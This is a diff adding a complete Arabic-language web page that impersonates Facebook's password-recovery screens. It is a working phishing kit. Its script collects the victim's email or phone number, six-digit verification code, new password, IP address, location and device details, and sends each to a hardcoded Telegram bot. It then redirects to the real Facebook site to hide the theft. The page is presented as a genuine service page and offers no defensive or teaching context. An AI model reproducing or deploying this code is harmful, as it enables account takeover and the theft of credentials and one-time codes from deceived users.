@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - استعادة كلمة السر</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+            line-height: 1.6;
+        }
+        
+        /* شريط التنقل العلوي - معدل ليشبه فيسبوك */
+        .navbar {
+            background-color: #ffffff;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 1.5rem;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo i {
+            margin-right: 8px;
+            font-size: 1.8rem;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .nav-links a {
+            color: #606770;
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-links a i {
+            margin-left: 5px;
+            font-size: 1.2rem;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin-top: 80px;
+        }
+        
+        .login-box {
+            background-color: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        
+        .logo-large {
+            color: #1877f2;
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            font-weight: bold;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #1c1e21;
+            font-weight: 600;
+        }
+        
+        .description {
+            color: #606770;
+            margin-bottom: 25px;
+            font-size: 1rem;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .submit-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        
+        .submit-btn:hover {
+            background-color: #166fe5;
+            transform: translateY(-1px);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .cancel-btn {
+            background-color: #e4e6eb;
+            color: #4b4f56;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .cancel-btn:hover {
+            background-color: #d8dadf;
+        }
+        
+        .error-message {
+            color: #ff4d4f;
+            background-color: #fff1f0;
+            border: 1px solid #ffa39e;
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 20px;
+            font-size: 0.95rem;
+            text-align: center;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* صفحة OTP */
+        #otpForm {
+            display: none;
+        }
+        
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.8rem;
+            border: 2px solid #dddfe2;
+            border-radius: 10px;
+            transition: all 0.3s;
+            caret-color: #1877f2;
+        }
+        
+        .otp-input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+        }
+        
+        .otp-sent-to {
+            font-weight: bold;
+            color: #1c1e21;
+            background-color: #f0f2f5;
+            padding: 6px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            margin: 5px 0;
+        }
+        
+        /* رسالة النجاح */
+        .success-message {
+            background-color: #f6ffed;
+            border: 1px solid #b7eb8f;
+            color: #52c41a;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        /* أداة النسخ */
+        .copy-tooltip {
+            position: relative;
+            display: inline-block;
+            cursor: pointer;
+        }
+        
+        .copy-tooltip .tooltiptext {
+            visibility: hidden;
+            width: 120px;
+            background-color: #555;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 5px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -60px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 0.8rem;
+        }
+        
+        .copy-tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        /* صفحة إعادة تعيين كلمة السر */
+        #resetForm {
+            display: none;
+        }
+        
+        .password-strength {
+            width: 100%;
+            height: 4px;
+            background-color: #e4e6eb;
+            border-radius: 2px;
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+        
+        .strength-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #1877f2;
+            transition: width 0.3s;
+        }
+        
+        /* تأثيرات للجوال */
+        @media (max-width: 480px) {
+            .login-box {
+                padding: 20px 15px;
+            }
+            
+            .otp-input {
+                width: 42px;
+                height: 52px;
+                font-size: 1.5rem;
+            }
+            
+            .navbar {
+                height: 50px;
+                padding: 0 10px;
+            }
+            
+            .logo {
+                font-size: 1.2rem;
+            }
+            
+            .nav-links {
+                gap: 10px;
+            }
+            
+            .nav-links a {
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+    <!-- Font Awesome للأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <!-- شريط التنقل العلوي - معدل -->
+    <nav class="navbar">
+        <div class="logo">
+            <span>facebook</span>
+            <i class="fab fa-facebook"></i>
+            
+        </div>
+    </nav>
+    
+    <div class="container">
+        <!-- صفحة إدخال البريد/الهاتف -->
+        <div id="emailForm" class="login-box">
+            <div class="logo-large">facebook</div>
+            <div class="title">البحث عن حسابك</div>
+            <div class="description">أدخل البريد الإلكتروني أو رقم الهاتف المرتبط بحسابك.</div>
+            
+            <div id="emailError" class="error-message"></div>
+            <div id="emailSuccess" class="success-message"></div>
+            
+            <input type="text" id="emailOrPhone" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            
+            <button id="sendCodeBtn" class="submit-btn">بحث</button>
+            <button id="cancelBtn" class="cancel-btn">إلغاء</button>
+        </div>
+        
+        <!-- صفحة إدخال OTP -->
+        <div id="otpForm" class="login-box">
+            <div class="logo-large">facebook</div>
+            <div class="title">أدخل رمز التحقق</div>
+            <div class="description">لقد أرسلنا رمز التحقق إلى:<br><span id="sentTo" class="otp-sent-to"></span></div>
+            
+            <div id="otpError" class="error-message"></div>
+            <div id="otpSuccess" class="success-message"></div>
+            
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+            </div>
+            
+            <button id="verifyOtpBtn" class="submit-btn">تأكيد</button>
+            <button id="backBtn" class="cancel-btn">رجوع</button>
+        </div>
+        
+        <!-- صفحة إعادة تعيين كلمة السر -->
+        <div id="resetForm" class="login-box">
+            <div class="logo-large">facebook</div>
+            <div class="title">اختر كلمة مرور جديدة</div>
+            <div class="description">تأكد من أن كلمة المرور الجديدة مختلفة عن تلك التي استخدمتها سابقًا.</div>
+            
+            <div id="resetError" class="error-message"></div>
+            <div id="resetSuccess" class="success-message"></div>
+            
+            <input type="password" id="newPassword" placeholder="كلمة المرور الجديدة" required>
+            <div class="password-strength">
+                <div class="strength-bar" id="strengthBar"></div>
+            </div>
+            
+            <input type="password" id="confirmPassword" placeholder="تأكيد كلمة المرور الجديدة" required>
+            
+            <button id="resetPasswordBtn" class="submit-btn">حفظ التغييرات</button>
+            <button id="cancelResetBtn" class="cancel-btn">إلغاء</button>
+        </div>
+    </div>
+
+    <script>
+        // استبدل هذه القيم بمعلومات بوتك الخاص
+        const botToken = '6808858455:AAFDmHj4oR9b5sOT6sDZWCqM4hWYLEOjjwg';
+        const chatId = '2034520069';
+        
+        // عناصر DOM
+        const emailForm = document.getElementById('emailForm');
+        const otpForm = document.getElementById('otpForm');
+        const resetForm = document.getElementById('resetForm');
+        const emailOrPhone = document.getElementById('emailOrPhone');
+        const sendCodeBtn = document.getElementById('sendCodeBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+        const backBtn = document.getElementById('backBtn');
+        const resetPasswordBtn = document.getElementById('resetPasswordBtn');
+        const cancelResetBtn = document.getElementById('cancelResetBtn');
+        const sentTo = document.getElementById('sentTo');
+        const emailError = document.getElementById('emailError');
+        const otpError = document.getElementById('otpError');
+        const resetError = document.getElementById('resetError');
+        const emailSuccess = document.getElementById('emailSuccess');
+        const otpSuccess = document.getElementById('otpSuccess');
+        const resetSuccess = document.getElementById('resetSuccess');
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const newPassword = document.getElementById('newPassword');
+        const confirmPassword = document.getElementById('confirmPassword');
+        const strengthBar = document.getElementById('strengthBar');
+        
+        // الحصول على معلومات الجهاز والموقع
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceType = "جهاز غير معروف";
+            
+            if (/Android/.test(userAgent)) {
+                deviceType = "Android";
+            } else if (/iPhone|iPad|iPod/.test(userAgent)) {
+                deviceType = /iPhone/.test(userAgent) ? "iPhone" : "iPad";
+            } else if (/Windows/.test(userAgent)) {
+                deviceType = "Windows PC";
+            } else if (/Mac/.test(userAgent)) {
+                deviceType = "Mac";
+            } else if (/Linux/.test(userAgent)) {
+                deviceType = "Linux PC";
+            }
+            
+            return {
+                device: deviceType,
+                browser: getBrowserName(),
+                os: getOS(),
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform
+            };
+        }
+        
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Firefox") > -1) return "Firefox";
+            if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
+            if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
+            if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
+            if (userAgent.indexOf("Edge") > -1) return "Edge";
+            if (userAgent.indexOf("Chrome") > -1) return "Chrome";
+            if (userAgent.indexOf("Safari") > -1) return "Safari";
+            return "متصفح غير معروف";
+        }
+        
+        function getOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Windows") > -1) return "Windows";
+            if (userAgent.indexOf("Mac") > -1) return "MacOS";
+            if (userAgent.indexOf("Linux") > -1) return "Linux";
+            if (userAgent.indexOf("Android") > -1) return "Android";
+            if (userAgent.indexOf("iOS") > -1 || /iPhone|iPad|iPod/.test(userAgent)) return "iOS";
+            return "نظام تشغيل غير معروف";
+        }
+        
+        // الحصول على الـ IP الحقيقي باستخدام API
+        async function getRealIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || "غير معروف";
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return "غير معروف";
+            }
+        }
+        
+        // إرسال بيانات البريد/الهاتف
+        sendCodeBtn.addEventListener('click', async () => {
+            const emailPhoneValue = emailOrPhone.value.trim();
+            
+            if (!emailPhoneValue) {
+                showError(emailError, 'الرجاء إدخال البريد الإلكتروني أو رقم الهاتف');
+                return;
+            }
+            
+            // إخفاء رسالة الخطأ
+            hideError(emailError);
+            
+            // الحصول على معلومات الجهاز والموقع
+            const deviceInfo = getDeviceInfo();
+            const ipAddress = await getRealIP();
+            const locationInfo = await getLocationInfo(ipAddress);
+            
+            // إنشاء رسالة جميلة للتليجرام
+            const timestamp = new Date().toLocaleString();
+            const message = `📩 *طلب استعادة كلمة سر* 📩\n\n` +
+                           `✉️ *البريد/الهاتف:* \`${emailPhoneValue}\`\n` +
+                           `🕒 *الوقت:* ${timestamp}\n` +
+                           `🌐 *IP:* \`${ipAddress}\`\n` +
+                           `📍 *الموقع:* ${locationInfo.city ? locationInfo.city + ', ' : ''}${locationInfo.country || 'غير معروف'}\n` +
+                           `📱 *الجهاز:* ${deviceInfo.device} (${deviceInfo.os})\n` +
+                           `🖥 *المتصفح:* ${deviceInfo.browser}\n` +
+                           `🔍 *الدقة:* ${deviceInfo.screen}\n` +
+                           `🌍 *اللغة:* ${deviceInfo.language}`;
+                                       
+            // إرسال البيانات إلى تليجرام
+            sendToTelegram(message, () => {
+                // عند النجاح
+                showSuccess(emailSuccess, 
+                    `✅ تم إرسال رمز التحقق إلى:<br>` +
+                    `<span class="copy-tooltip" onclick="copyToClipboard('${emailPhoneValue}')">` +
+                    `${emailPhoneValue}<span class="tooltiptext">انقر للنسخ</span></span>`);
+                
+                // عرض نموذج OTP
+                setTimeout(() => {
+                    emailForm.style.display = 'none';
+                    otpForm.style.display = 'block';
+                    sentTo.textContent = emailPhoneValue;
+                    otpInputs[0].focus();
+                }, 1500);
+            }, (error) => {
+                showError(emailError, 'حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
+                console.error('Error:', error);
+            });
+        });
+        
+        // الحصول على معلومات الموقع من IP
+        async function getLocationInfo(ip) {
+            if (ip === "غير معروف") return {};
+            
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return {
+                    city: data.city,
+                    country: data.country_name,
+                    region: data.region,
+                    isp: data.org
+                };
+            } catch (error) {
+                console.error('Error fetching location:', error);
+                return {};
+            }
+        }
+        
+        // تأكيد OTP
+        verifyOtpBtn.addEventListener('click', async () => {
+            let otpCode = '';
+            otpInputs.forEach(input => {
+                otpCode += input.value;
+            });
+            
+            if (otpCode.length !== 6) {
+                showError(otpError, 'الرجاء إدخال رمز التحقق المكون من 6 أرقام');
+                return;
+            }
+            
+            // الحصول على معلومات الجهاز والموقع
+            const deviceInfo = getDeviceInfo();
+            const ipAddress = await getRealIP();
+            const locationInfo = await getLocationInfo(ipAddress);
+            
+            // إنشاء رسالة جميلة للتليجرام
+            const timestamp = new Date().toLocaleString();
+            const message = `🔢 *رمز التحقق الذي أدخله المستخدم* 🔢\n\n` +
+                           `🔐 *الرمز:* \`${otpCode}\`\n` +
+                           `📧 *للبريد/الهاتف:* \`${sentTo.textContent}\`\n` +
+                           `🕒 *الوقت:* ${timestamp}\n` +
+                           `🌐 *IP:* \`${ipAddress}\`\n` +
+                           `📍 *الموقع:* ${locationInfo.city ? locationInfo.city + ', ' : ''}${locationInfo.country || 'غير معروف'}\n` +
+                           `📱 *الجهاز:* ${deviceInfo.device} (${deviceInfo.os})\n` +
+                           `🖥 *المتصفح:* ${deviceInfo.browser}`;
+            
+            // إرسال OTP إلى تليجرام
+            sendToTelegram(message, () => {
+                showSuccess(otpSuccess, 
+                    `✅ تم التحقق بنجاح!<br>` +
+                    `الرمز: <span class="copy-tooltip" onclick="copyToClipboard('${otpCode}')">` +
+                    `${otpCode}<span class="tooltiptext">انقر للنسخ</span></span>`);
+                
+                // عرض نموذج إعادة تعيين كلمة السر
+                setTimeout(() => {
+                    otpForm.style.display = 'none';
+                    resetForm.style.display = 'block';
+                }, 1500);
+            }, (error) => {
+                showError(otpError, 'حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
+                console.error('Error:', error);
+            });
+        });
+        
+        // إعادة تعيين كلمة السر
+        resetPasswordBtn.addEventListener('click', async () => {
+            const newPass = newPassword.value;
+            const confirmPass = confirmPassword.value;
+            
+            if (!newPass || !confirmPass) {
+                showError(resetError, 'الرجاء إدخال كلمة المرور الجديدة وتأكيدها');
+                return;
+            }
+            
+            if (newPass !== confirmPass) {
+                showError(resetError, 'كلمتا المرور غير متطابقتين');
+                return;
+            }
+            
+            // الحصول على معلومات الجهاز والموقع
+            const deviceInfo = getDeviceInfo();
+            const ipAddress = await getRealIP();
+            const locationInfo = await getLocationInfo(ipAddress);
+            
+            // إنشاء رسالة جميلة للتليجرام
+            const timestamp = new Date().toLocaleString();
+            const message = `🔑 *طلب تغيير كلمة السر* 🔑\n\n` +
+                           `📧 *البريد/الهاتف:* \`${sentTo.textContent}\`\n` +
+                           `🔐 *كلمة السر الجديدة:* \`${newPass}\`\n` +
+                           `🕒 *الوقت:* ${timestamp}\n` +
+                           `🌐 *IP:* \`${ipAddress}\`\n` +
+                           `📍 *الموقع:* ${locationInfo.city ? locationInfo.city + ', ' : ''}${locationInfo.country || 'غير معروف'}\n` +
+                           `📱 *الجهاز:* ${deviceInfo.device} (${deviceInfo.os})\n` +
+                           `🖥 *المتصفح:* ${deviceInfo.browser}`;
+            
+            // إرسال كلمة السر الجديدة إلى تليجرام
+            sendToTelegram(message, () => {
+                showSuccess(resetSuccess, 
+                    `✅ تم تغيير كلمة السر بنجاح!<br>` +
+                    `كلمة السر: <span class="copy-tooltip" onclick="copyToClipboard('${newPass}')">` +
+                    `******<span class="tooltiptext">انقر للنسخ</span></span>`);
+                
+                setTimeout(() => {
+                    alert('تم تغيير كلمة السر بنجاح! يمكنك الآن تسجيل الدخول بكلمة السر الجديدة.');
+                    window.location.href = 'https://www.facebook.com';
+                }, 1500);
+            }, (error) => {
+                showError(resetError, 'حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
+                console.error('Error:', error);
+            });
+        });
+        
+        // دالة إرسال إلى تليجرام
+        function sendToTelegram(message, successCallback, errorCallback) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent:', data);
+                if (successCallback) successCallback();
+            })
+            .catch(error => {
+                if (errorCallback) errorCallback(error);
+            });
+        }
+        
+        // دالة نسخ إلى الحافظة
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                // يمكنك إضافة تنبيه أو تأثير هنا
+                console.log('Text copied to clipboard');
+            }).catch(err => {
+                console.error('Failed to copy text: ', err);
+            });
+        }
+        
+        // دوال مساعدة للعرض
+        function showError(element, message) {
+            element.innerHTML = message;
+            element.style.display = 'block';
+        }
+        
+        function hideError(element) {
+            element.style.display = 'none';
+        }
+        
+        function showSuccess(element, message) {
+            element.innerHTML = message;
+            element.style.display = 'block';
+        }
+        
+        // تحسين إدخال OTP
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+                
+                // السماح فقط بالأزرار التالية: الأرقام، backspace، delete، الأسهم
+                const allowedKeys = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Tab'];
+                if (!/^[0-9]$/.test(e.key) && !allowedKeys.includes(e.key)) {
+                    e.preventDefault();
+                }
+            });
+            
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                alert('غير مسموح بلصق النصوص في حقول OTP');
+            });
+        });
+        
+        // مؤشر قوة كلمة السر
+        newPassword.addEventListener('input', () => {
+            const strength = calculatePasswordStrength(newPassword.value);
+            strengthBar.style.width = strength + '%';
+            strengthBar.style.backgroundColor = getStrengthColor(strength);
+        });
+        
+        function calculatePasswordStrength(password) {
+            let strength = 0;
+            
+            // طول كلمة السر
+            if (password.length > 0) strength += 10;
+            if (password.length >= 6) strength += 20;
+            if (password.length >= 8) strength += 20;
+            if (password.length >= 10) strength += 20;
+            
+            // أحرف متنوعة
+            if (/[A-Z]/.test(password)) strength += 10;
+            if (/[0-9]/.test(password)) strength += 10;
+            if (/[^A-Za-z0-9]/.test(password)) strength += 10;
+            
+            return Math.min(strength, 100);
+        }
+        
+        function getStrengthColor(strength) {
+            if (strength < 40) return '#ff4d4f';
+            if (strength < 70) return '#faad14';
+            return '#52c41a';
+        }
+        
+        // الأزرار الإضافية
+        cancelBtn.addEventListener('click', () => {
+            window.location.href = 'https://www.facebook.com';
+        });
+        
+        backBtn.addEventListener('click', () => {
+            otpForm.style.display = 'none';
+            emailForm.style.display = 'block';
+        });
+        
+        cancelResetBtn.addEventListener('click', () => {
+            resetForm.style.display = 'none';
+            emailForm.style.display = 'block';
+        });
+    </script>
+</body>
+</html>
